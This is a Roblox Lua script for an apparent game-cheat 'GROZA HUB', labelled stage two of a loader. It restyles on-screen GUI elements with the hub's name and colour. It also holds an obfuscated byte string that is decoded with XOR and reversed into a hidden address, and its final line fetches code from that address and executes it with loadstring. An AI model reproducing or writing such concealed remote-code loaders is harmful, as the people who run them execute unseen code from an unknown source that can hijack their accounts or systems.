
--[[ STAGE 2: VISUAL CORE ]]
local QNcRYerPnelaR="\041\193\060\002\061\193\210\202\021\223\220\213\238\229\242\049\129\238\130\137\131\203\142\141\137\153\223\167\156\157\165\172\247\191\182\185\074\139\175\182\184\153\189\181\187\171\115\119\122\111\007\008\071\009\015\007\086\032\030\025\044\042\047\039\058\049\195\201\058\209\200\216\209\211\030\235\217\238\047\051\194\255\128\136\140\132"local hzgZfhEdtLK8Pmx8buNN=192 local etHxmeaheTdobv=111 local KKLnlBTmHLqVUxKZ=1 local ejJacr_Zo7qCyMX5XX=4 local ujpy2sJ0C9iHJzgPKVat6T=21 local HiWLXUC1XxxWZ1PQk1B1=true local OV66I9vP0Ev5qzcxL_v=bit32 and bit32.bxor if not OV66I9vP0Ev5qzcxL_v then OV66I9vP0Ev5qzcxL_v=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local k3X16qKie23o_lq={}for WhDFrtPpHRfJZWO=1,#QNcRYerPnelaR do local SfRxUbdlPMHKLsVWGtqdJ=string.byte(QNcRYerPnelaR,WhDFrtPpHRfJZWO)local wo2A3TWUZNh7=(etHxmeaheTdobv+(WhDFrtPpHRfJZWO*ejJacr_Zo7qCyMX5XX)+ujpy2sJ0C9iHJzgPKVat6T)%256 if KKLnlBTmHLqVUxKZ==0 then SfRxUbdlPMHKLsVWGtqdJ=(SfRxUbdlPMHKLsVWGtqdJ-wo2A3TWUZNh7)%256 k3X16qKie23o_lq[WhDFrtPpHRfJZWO]=string.char(OV66I9vP0Ev5qzcxL_v(SfRxUbdlPMHKLsVWGtqdJ,hzgZfhEdtLK8Pmx8buNN))else SfRxUbdlPMHKLsVWGtqdJ=OV66I9vP0Ev5qzcxL_v(SfRxUbdlPMHKLsVWGtqdJ,hzgZfhEdtLK8Pmx8buNN)k3X16qKie23o_lq[WhDFrtPpHRfJZWO]=string.char((SfRxUbdlPMHKLsVWGtqdJ-wo2A3TWUZNh7)%256)end end local Vscy6YlVFdAfBVOmXQ_=table.concat(k3X16qKie23o_lq)if HiWLXUC1XxxWZ1PQk1B1 then Vscy6YlVFdAfBVOmXQ_=string.reverse(Vscy6YlVFdAfBVOmXQ_)end local EDQF3YVrArRWJ=Vscy6YlVFdAfBVOmXQ_
local HubName = "GROZA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(EDQF3YVrArRWJ))()
